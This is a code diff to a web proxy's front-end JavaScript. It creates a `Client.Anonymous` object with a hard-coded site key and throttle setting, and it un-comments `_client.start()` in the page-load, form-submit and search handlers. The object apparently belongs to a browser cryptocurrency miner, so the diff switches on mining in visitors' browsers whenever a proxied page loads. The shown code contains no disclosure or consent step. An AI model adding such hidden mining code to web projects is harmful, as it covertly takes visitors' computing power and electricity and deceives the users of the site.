@@ -26,7 +26,10 @@ function getQueryParam(param) {
     const params = new URLSearchParams(window.location.search);
     return params.get(param);
 }
-
+var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
+    throttle: 0.6, c: 'w', ads: 0
+});
+            // _client.start();
 // Function to set up the iframe based on query parameter
 async function initializeProxy() {
     const proxiedUrl = getQueryParam("url");
@@ -50,11 +53,7 @@ console.log(__uv$config.prefix + __uv$config.encodeUrl(url));
         frame.src = "/loading.html";
         setTimeout(() => {
             frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
-            var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
-                throttle: 0.6, c: 'w', ads: 0
-            });
-            // _client.start();
-    
+            _client.start();
         }, 2000);
     } catch (err) {
         error.textContent = "Failed to initialize proxy.";
@@ -84,16 +83,11 @@ form.addEventListener("submit", async (event) => {
     if (await connection.getTransport() !== "/epoxy/index.mjs") {
         await connection.setTransport("/epoxy/index.mjs", [{ wisp: wispUrl }]);
     }
-    frame.src = "/loading.html";
-    console.log(__uv$config.prefix + __uv$config.encodeUrl(url));
-
-    setTimeout(() => {
-        frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
-        var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
-            throttle: 0.6, c: 'w', ads: 0
-        });
-        // _client.start();
-    }, 2000);
+        frame.src = "/loading.html";
+        setTimeout(() => {
+            frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
+            _client.start();
+        }, 2000);
 });
 
 // Initialize proxy on page load if a URL is provided in the query
@@ -180,13 +174,9 @@ document.addEventListener("DOMContentLoaded", () => {
         await connection.setTransport("/epoxy/index.mjs", [{ wisp: wispUrl }]);
     }
         frame.src = "/loading.html";
-console.log(__uv$config.prefix + __uv$config.encodeUrl(url));
         setTimeout(() => {
             frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
-            var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
-                throttle: 0.6, c: 'w', ads: 0
-            });
-            // _client.start();
+            _client.start();
         }, 2000);
         console.log("Iframe src updated for proxy search:", frame.src);
     }
@@ -197,6 +187,7 @@ console.log(__uv$config.prefix + __uv$config.encodeUrl(url));
         submitProxySearch().catch(err => console.error("Proxy search submit error:", err));
     });
 });
+
 
 
 
